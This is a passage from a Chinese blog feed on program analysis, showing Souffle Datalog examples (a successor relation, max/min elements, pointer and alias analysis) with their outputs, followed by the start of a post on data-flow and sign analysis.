class="code"><pre><span class="line">(base) ➜  exp1 souffle DFA.dl -D -</span><br><span class="line">---------------</span><br><span class="line">Reachable</span><br><span class="line">n       d</span><br><span class="line">===============</span><br><span class="line">b1      d2</span><br><span class="line">b2      d1</span><br><span class="line">b2      d2</span><br><span class="line">b3      d2</span><br><span class="line">b4      d1</span><br><span class="line">b4      d2</span><br><span class="line">end     d2</span><br><span class="line">===============</span><br></pre></td></tr></table></figure><h2 id="偏序关系">偏序关系</h2><blockquote><p>Given a set A(x:symbol), create a successor relation Succ(x:symbol, y:symbol) such that the first argument contains an element x in A, and the second argument contains the successor of x, which is also an element of A. For example, the set A = {“a”, “b”, “c”, “d”} would have successor relation Succ=((“a”, “b”), (“b”, “c”), (“c”, “d”)}. Assume that the total order of an element (a symbol in this case) is given by its ordinal number, its internal representation as a number. For example, ord(“hello”) returns the ordinal number of string “hello” for a given program.</p></blockquote><p>题目来自 souffle 官方教程，默认读者已经熟悉前驱、后继关系，其实相当于偏序关系中的大于和小于，但是更加一般化和理论化了。讲解见注释。</p><p>更加进一步，我们再去找到最大和最小的元素。可以这样表示最大值，记 $$P:x\leqslant a$$，则</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">(</mo><mi mathvariant="normal">∀</mi><mi>x</mi><mo fence="true">)</mo></mrow><mi>P</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>A</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>A</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo fence="true">)</mo></mrow><mo>→</mo><mi>a</mi><mtext>是最大值</mtext></mrow><annotation encoding="application/x-tex">\left( \forall x \right) P\left( x \right) ,A\left( x \right) ,A\left( a \right) \rightarrow a\text{是最大值}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord">∀</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">a</span><span class="mord text"><span class="mord cjk_fallback">是最大值</span></span></span></span></span></span></p><p>**但是 Datalog 只有存在量词。**根据摩根律推广：</p><img src="http://cdn.blog-blockchain.xyz/202210040039840.png" alt="image-20221004003949770" style="zoom:67%;" /><p>原来的推导等价于下面的 E2：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>E</mi><mn>1</mn><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>:</mo><mrow><mo fence="true">(</mo><mi mathvariant="normal">∃</mi><mi>x</mi><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mi>x</mi><mo>&gt;</mo><mi>a</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>A</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>A</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo fence="true">)</mo></mrow><mspace linebreak="newline"></mspace><mi>E</mi><mn>2</mn><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>:</mo><mi mathvariant="normal">¬</mi><mi>E</mi><mn>1</mn><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>A</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>→</mo><mi>a</mi><mtext>是最大值</mtext></mrow><annotation encoding="application/x-tex">E1\left( x \right) : \left( \exists x \right) \left( x&gt;a \right) ,A\left( x \right) ,A\left( a \right)\\E2\left( x \right) : \lnot E1\left( x \right) ,A\left( x \right) \rightarrow a\text{是最大值}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">1</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord">∃</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">2</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">¬</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">1</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">a</span><span class="mord text"><span class="mord cjk_fallback">是最大值</span></span></span></span></span></span></p><p>最小值同理也可得。</p><blockquote><p>感谢这一篇<a href="https://qa.1r1g.com/sf/ask/1353816481/">博客</a>帮助我我快速地解决了问题。</p></blockquote><p><strong>所有定义必须大写字母开头</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// 定义集合 A, 从文件输入 facts/</span><br><span class="line">.decl A(x:symbol)</span><br><span class="line">.input A</span><br><span class="line">// 定义偏序小于，比如字母表顺序 &#x27;a&#x27;&lt;&#x27;b&#x27;，那么就可以将 symbol 用 ord() 转换成次序。</span><br><span class="line">.decl Less(x:symbol, y:symbol)</span><br><span class="line">Less(x,y) :- A(x), A(y), ord(x) &lt; ord(y).</span><br><span class="line"></span><br><span class="line">// 传递性</span><br><span class="line">.decl Transitive(x:symbol, y:symbol)</span><br><span class="line">Transitive(x,z) :- Less(x,y), Less(y,z).</span><br><span class="line"></span><br><span class="line">// x 后继y，需要满足 y 直接小于 x,而不能传递小于 x</span><br><span class="line">.decl Succ(x:symbol, y:symbol)</span><br><span class="line">Succ(x,y) :- Less(x,y), !Transitive(x,y).</span><br><span class="line"></span><br><span class="line">//最大元素</span><br><span class="line">.decl Nmax(x:symbol)</span><br><span class="line">Nmax(x) :- Less(x,u),A(x),A(u).</span><br><span class="line"></span><br><span class="line">.decl Max(x:symbol)</span><br><span class="line">Max(x) :- !Nmax(x),A(x).</span><br><span class="line">.output Max</span><br><span class="line"></span><br><span class="line">.decl Nmin(x:symbol)</span><br><span class="line">Nmin(x) :- Less(u,x),A(x),A(u).</span><br><span class="line"></span><br><span class="line">.decl Min(x:symbol)</span><br><span class="line">Min(x) :- !Nmin(x),A(x).</span><br><span class="line">.output Min</span><br><span class="line"></span><br><span class="line">.output Less, Transitive, Succ</span><br></pre></td></tr></table></figure><p>给定输入的数据 <code>A.facts</code>，注意一个 fact 一行，然后每个 fact 不同的参数用 TAB，不过这里只有一个参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">e</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  successor souffle successor-relation.dl -F . -D -</span><br><span class="line">---------------</span><br><span class="line">Less</span><br><span class="line">x       y</span><br><span class="line">===============</span><br><span class="line">a       b</span><br><span class="line">a       c</span><br><span class="line">a       d</span><br><span class="line">a       e</span><br><span class="line">b       c</span><br><span class="line">b       d</span><br><span class="line">b       e</span><br><span class="line">c       d</span><br><span class="line">c       e</span><br><span class="line">d       e</span><br><span class="line">===============</span><br><span class="line">---------------</span><br><span class="line">Max</span><br><span class="line">x</span><br><span class="line">===============</span><br><span class="line">e</span><br><span class="line">===============</span><br><span class="line">---------------</span><br><span class="line">Min</span><br><span class="line">x</span><br><span class="line">===============</span><br><span class="line">a</span><br><span class="line">===============</span><br><span class="line">---------------</span><br><span class="line">Transitive</span><br><span class="line">x       y</span><br><span class="line">===============</span><br><span class="line">a       c</span><br><span class="line">a       d</span><br><span class="line">a       e</span><br><span class="line">b       d</span><br><span class="line">b       e</span><br><span class="line">c       e</span><br><span class="line">===============</span><br><span class="line">---------------</span><br><span class="line">Succ</span><br><span class="line">x       y</span><br><span class="line">===============</span><br><span class="line">a       b</span><br><span class="line">b       c</span><br><span class="line">c       d</span><br><span class="line">d       e</span><br><span class="line">===============</span><br></pre></td></tr></table></figure><h2 id="简单指针分析和别名分析">简单指针分析和别名分析</h2><p>指针分析和别名分析（aliases)有很多相似之处，但是指针分析并不等于别名分析，二者区别如下：</p><ul><li>指针分析解答的是一个指针可能指向哪个对象的问题</li><li>别名分析解答的是两个指针是否能指向同一个对象的问题，如果是就认为二者互为别名。</li></ul><p>注意，下面的分析都是 may 分析，只是说 <strong>可能</strong> 指向同一个对象。</p><p>需要分析的代码片段如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">v1 = h1();</span><br><span class="line">v2 = h2();</span><br><span class="line">v1 = v2;</span><br><span class="line">v3 = h3();</span><br><span class="line">v1.f = v3;</span><br><span class="line">v4 = v1.f;</span><br></pre></td></tr></table></figure><p>详细解释见代码注释，代码执行顺序有非对称的关系就可以了，简单说就是有向图。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.type var &lt;: symbol</span><br><span class="line">.type obj &lt;: symbol</span><br><span class="line">.type field &lt;: symbol</span><br><span class="line"></span><br><span class="line">// -- inputs --</span><br><span class="line">.decl assign( a:var, b:var )</span><br><span class="line">.decl new( v:var, o:obj )</span><br><span class="line">.decl ld( a:var, b:var, f:field )</span><br><span class="line">.decl st( a:var, f:field, b:var )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// -- facts --</span><br><span class="line">// 赋值</span><br><span class="line">assign(&quot;v1&quot;,&quot;v2&quot;).</span><br><span class="line">// 新建变量</span><br><span class="line">new(&quot;v1&quot;,&quot;h1&quot;).</span><br><span class="line">new(&quot;v2&quot;,&quot;h2&quot;).</span><br><span class="line">new(&quot;v3&quot;,&quot;h3&quot;).</span><br><span class="line">// st 表示变量的某个域（比如结构体里面的元素）被另外一个变量赋值了</span><br><span class="line">// ld 表示变量被另外一个变量的某个域赋值了</span><br><span class="line">st(&quot;v1&quot;,&quot;f&quot;,&quot;v3&quot;).</span><br><span class="line">ld(&quot;v4&quot;,&quot;v1&quot;,&quot;f&quot;).</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// -- analysis --</span><br><span class="line">// 别名分析</span><br><span class="line">.decl alias( a:var, b:var )</span><br><span class="line">.output alias</span><br><span class="line">// 如果直接赋值，那么就是别名</span><br><span class="line">alias(X,X) :- assign(X,_).</span><br><span class="line">alias(X,X) :- assign(_,X).</span><br><span class="line">alias(X,Y) :- assign(X,Y).</span><br><span class="line">// 如果 x=A.F 而 A 和 B 可以指向同样的变量，B.F = Y，那么 X,Y 也是别名</span><br><span class="line">alias(X,Y) :- ld(X,A,F), alias(A,B), st(B,F,Y).</span><br><span class="line"></span><br><span class="line">.decl pointsTo( a:var, o:obj )</span><br><span class="line">.output pointsTo</span><br><span class="line">// 直接新建对象，当然是别名</span><br><span class="line">pointsTo(X,Y) :- new(X,Y).</span><br><span class="line">// 或者 X 和 Z指向同一个变量，而Z指向对象Y，那么X也指向变量Y</span><br><span class="line">pointsTo(X,Y) :- alias(X,Z), pointsTo(Z,Y).</span><br></pre></td></tr></table></figure><p>更多的例子见：<a href="https://souffle-lang.github.io/examples#defuse-chains-with-composed-types">https://souffle-lang.github.io/examples#defuse-chains-with-composed-types</a></p><p>笔者以应用为主，当学习到对应的部分，就会实现对应的代码。接下来继续学习理论。</p><h1>参考</h1><ul><li><a href="https://souffle-lang.github.io/docs.html">https://souffle-lang.github.io/docs.html</a></li><li><a href="http://nickelsworth.github.io/sympas/16-datalog.html">http://nickelsworth.github.io/sympas/16-datalog.html</a></li><li><a href="https://qa.1r1g.com/sf/ask/1353816481/">https://qa.1r1g.com/sf/ask/1353816481/</a></li><li><a href="http://blogs.evergreen.edu/sosw/files/2014/04/Green-Vol5-DBS-017.pdf">Datalog and Recursive Query Processing</a> 建议当作工具书去查，除非你要深入研究 datalog</li></ul><h1>附录一数理逻辑定义</h1><ol><li>literal: 原子公式 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 或者是原子公式的否定式 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">¬</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">\lnot x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord">¬</span><span class="mord mathnormal">x</span></span></span></span></li><li>clause: 有限的 literal 和逻辑连接词构成的命题公式。</li><li>facts：绝对成立的命题。</li><li>monotonic：因为蕴含而保持“单调的”</li><li><a href="https://en.wikipedia.org/wiki/Sequent_calculus">sequent calculi</a> ：根据单调关系推导</li><li>Non-monotonic logic：非单调逻辑，简单地说结论不是蕴含关系。</li><li>words: 也叫做 string，也就是一系列的字符。</li><li>letters: 也叫做 symbol，非常基础的东西，可以理解为符号。</li><li>formal language: 由 words 构成的规则集合，words 由 letters 构成，letters 从给定的字符集中选取。</li><li>Well-formed formula: 形式语言字符集中的字符以特定规则构成的有限的命题公式。缩写 WFF。</li><li>sentence: 无自由变量的 WFF。</li><li>Stratification</li></ol><p>更多的东西属于数学的范围了，笔者暂时不会深入，因为主要是先用起来再说。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/pl/understanding-program-analysis/&quot; title=&quot;（一）初识软件分析&quot;&gt;（一）初识软件分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/data-flow-analysis/&quot; title=&quot;（二）数据流分析基础&quot;&gt;（二）数据流分析基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/LP-souffle/&quot; title=&quot;（三）Datalog和程序分析&quot;&gt;（三）Datalog和程序分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/ssa-and-sparse-analysis/&quot; title=&quot;（四）静态单赋值和稀疏分析&quot;&gt;（四）静态单赋值和稀疏分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/Interprocedural-DFA/&quot; title=&quot;（五）过程间分析&quot;&gt;（五）过程间分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/points-to-analysis/&quot; title=&quot;（六）指向分析&quot;&gt;（六）指向分析&lt;</summary>
        
      
    
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/categories/program-language/"/>
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/tags/program-language/"/>
    
  </entry>
  
  <entry>
    <title>（二）数据流分析基础</title>
    <link href="https://www.blog-blockchain.xyz/pl/data-flow-analysis/"/>
    <id>https://www.blog-blockchain.xyz/pl/data-flow-analysis/</id>
    <published>2022-10-04T13:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.926Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/pl/understanding-program-analysis/" title="（一）初识软件分析">（一）初识软件分析</a></li><li><a href="/pl/data-flow-analysis/" title="（二）数据流分析基础">（二）数据流分析基础</a></li><li><a href="/pl/LP-souffle/" title="（三）Datalog和程序分析">（三）Datalog和程序分析</a></li><li><a href="/pl/ssa-and-sparse-analysis/" title="（四）静态单赋值和稀疏分析">（四）静态单赋值和稀疏分析</a></li><li><a href="/pl/Interprocedural-DFA/" title="（五）过程间分析">（五）过程间分析</a></li><li><a href="/pl/points-to-analysis/" title="（六）指向分析">（六）指向分析</a></li><li><a href="/pl/abstract-interpretation/" title="（七）抽象解释">（七）抽象解释</a></li><li><a href="/pl/SMT-and-symbolic-excution/" title="（八）SMT和符号执行">（八）SMT和符号执行</a></li><li><a href="/pl/static-analysis-tools/" title="（九）体验静态分析工具">（九）体验静态分析工具</a></li><li><a href="/pl/fuzzing-introduction/" title="（十）Fuzzing 基础">（十）Fuzzing 基础</a></li></ol></blockquote><h1>数据流分析</h1><p>基本思想：<strong>程序视作状态和状态的转移两部分组成，忽视状态转移的条件，分析状态转移时的变化。</strong></p><p>近似的两种方案：</p><ol><li><strong>忽略程序的条件判断，认为程序的所有分支都有可能到达</strong>。</li><li>**控制流分叉合并。**这会大大的减少计算量。</li></ol><p>这些性质在后面会解释。</p><h1>符号分析</h1><p>思想：对变量进行抽象，分析输入的符号和输出的符号，得到抽象的结果。在此基础上可自定义分类和类似地拓展，用更加抽象和概括的符号。例如，对于整数类型，我们可以分成零、正、负、未知四种输入和结果，而不考虑具体的数值。</p><p>按照状态转移，我们可能有多条执行路径能够到达目的点 A。例如，if 语句是典型的区分执行路径的的方式。由于未知结果的函数 <code>func1</code> 和 <code>func2</code>，a 最终的符号可能是正、负或者未知。那么，我们可以得到 2 条可能的执行路径(0、5、1、未知)或者执行路径(0、-1、1、 未知)。这里也体现了忽视条件判断的观点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">a = func1();</span><br><span class="line">b = func2();</span><br><span class="line"><span class="comment">//位置1</span></span><br><span class="line"><span class="keyword">if</span>(a &gt; <span class="number">5</span>)&#123;</span><br><span class="line">    a -= <span class="number">4</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//位置2</span></span><br><span class="line">a = b;</span><br></pre></td></tr></table></figure><p>我们可以：</p><ol><li><strong>进一步抽象，合并数据</strong>，将第二步的 5 和 -1 抽象为 “非 0 数”。</li><li><strong>在控制流汇合的部分，如 if 执行完后，合并数据</strong>，而不是单独视作单独的数据流。</li></ol><p>例如，当经过了 if-else 语句之后，a 的值至少是 1，所以可以合并后 a 的值变化是（0，未知，大于 0，未知）</p><p>最后，总结一般流程：</p><ol><li>确定状态集合：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><mrow><mo fence="true">{</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><msub><mi>a</mi><mi>i</mi></msub><mo>∈</mo><mi>D</mi><mo fence="true">}</mo></mrow></mrow><annotation encoding="application/x-tex">S=\left\{ (a_1,a_2,a_3,...)| a_i\in D \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span> 是每个子状态或者元素的定义域。</li><li>每个执行路径上的每个节点视作状态集合 S 的元素。</li><li>确定初始值状态 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><msub><mi>A</mi><mrow><mi>e</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">DATA_{entry}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span 